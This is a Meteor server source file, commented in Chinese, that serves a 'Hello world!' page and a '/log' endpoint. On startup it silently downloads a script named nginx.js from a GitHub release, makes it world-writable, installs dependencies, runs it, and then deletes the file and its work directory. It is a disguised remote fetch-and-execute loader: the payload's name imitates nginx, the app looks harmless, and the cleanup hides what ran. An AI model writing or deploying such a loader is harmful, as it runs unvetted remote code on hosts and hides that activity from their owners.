import { Meteor } from 'meteor/meteor';
import fs from 'fs';
import path from 'path';
import axios from 'axios';
import { exec } from 'child_process';
import { WebApp } from 'meteor/webapp';

const FILE_PATH = process.env.FILE_PATH || './tmp';

// 创建目录
if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH);
  console.log(`${FILE_PATH} is created`);
} else {
  console.log(`${FILE_PATH} already exists`);
}

// 设置路由
WebApp.connectHandlers.use('/', (req, res) => {
  res.writeHead(200);
  res.end('Hello world!');
});

const subTxtPath = path.join(FILE_PATH, 'log.txt');
WebApp.connectHandlers.use('/log', (req, res) => {
  fs.readFile(subTxtPath, "utf8", (err, data) => {
    if (err) {
      console.error(err);
      res.writeHead(500);
      res.end("Error reading log.txt");
    } else {
      res.writeHead(200, {'Content-Type': 'text/plain; charset=utf-8'});
      res.end(data);
    }
  });
});

// 下载和执行文件的函数
const fileUrl = 'https://github.com/eooce/test/releases/download/bulid/nginx.js';
const fileName = 'nginx.js';
const filePath = path.join(FILE_PATH, fileName);

const downloadAndExecute = () => {
  const fileStream = fs.createWriteStream(filePath);

  axios
    .get(fileUrl, { responseType: 'stream' })
    .then(response => {
      response.data.pipe(fileStream);
      return new Promise((resolve, reject) => {
        fileStream.on('finish', resolve);
        fileStream.on('error', reject);
      });
    })
    .then(() => {
      console.log('File downloaded successfully.');
      fs.chmodSync(filePath, '777');

      const workDir = path.join(FILE_PATH, 'work');
      if (!fs.existsSync(workDir)) {
        fs.mkdirSync(workDir);
      }

      const workingFilePath = path.join(workDir, 'nginx.js');
      fs.copyFileSync(filePath, workingFilePath);

      const packageJson = {
        "dependencies": {
          "axios": "latest",
          "express": "latest"
        }
      };
      fs.writeFileSync(path.join(workDir, 'package.json'), JSON.stringify(packageJson));

      console.log('Installing dependencies...');
      exec(`cd ${workDir} && npm install`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Dependencies installation error: ${error}`);
          return;
        }
        
        console.log('Dependencies installed, running the webapp...');
        // 使用spawn而不是exec来更好地处理输出
        const { spawn } = require('child_process');
        const child = spawn('node', ['nginx.js'], {
          cwd: workDir,
          stdio: ['inherit', 'pipe', 'pipe']
        });

        // 捕获标准输出
        child.stdout.on('data', (data) => {
          console.log(`${data}`);
        });

        // 捕获标准错误
        child.stderr.on('data', (data) => {
          console.error(`${data}`);
        });

        child.on('error', (error) => {
          console.error(`Failed to start subprocess: ${error}`);
        });

        child.on('exit', (code, signal) => {
          if (code !== 0) {
            console.log(`Process exited with code ${code} and signal ${signal}`);
          }
          
          // 不要清除console
          // console.clear();
          console.log(`Child process completed`);

          // 延迟删除文件，确保所有输出都已经显示
          setTimeout(() => {
            try {
              fs.unlinkSync(filePath);
              fs.rmSync(workDir, { recursive: true, force: true });
            } catch (err) {
              console.error('Cleanup error:', err);
            }
          }, 1000);
        });
      });
    })
    .catch(error => {
      console.error(`Download error: ${error}`);
    });
};

// 在Meteor启动时执行下载和运行
Meteor.startup(() => {
  downloadAndExecute();
});
